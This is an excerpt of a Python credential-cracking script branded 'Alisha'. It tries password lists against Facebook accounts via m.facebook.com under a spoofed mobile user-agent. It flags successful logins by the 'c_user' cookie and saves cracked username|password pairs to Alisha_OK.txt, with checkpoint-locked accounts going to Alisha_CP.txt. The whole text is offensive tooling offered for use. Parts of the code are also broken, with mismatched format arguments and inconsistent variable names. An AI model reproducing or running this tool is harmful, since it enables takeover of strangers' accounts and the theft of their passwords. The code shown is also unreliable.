...
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAlisha_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAlisha_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back Alisha Menu ")
	    Sad_Boy()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;97m[Alisha] {loop}|{len(self.id)} [OK][{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
               ...
               'authority': 'm.facebook.com',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Alisha-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('Alisha_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [Alisha-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Alisha_CP.txt' , 'a').write('%s\n' % wrt)
                        break
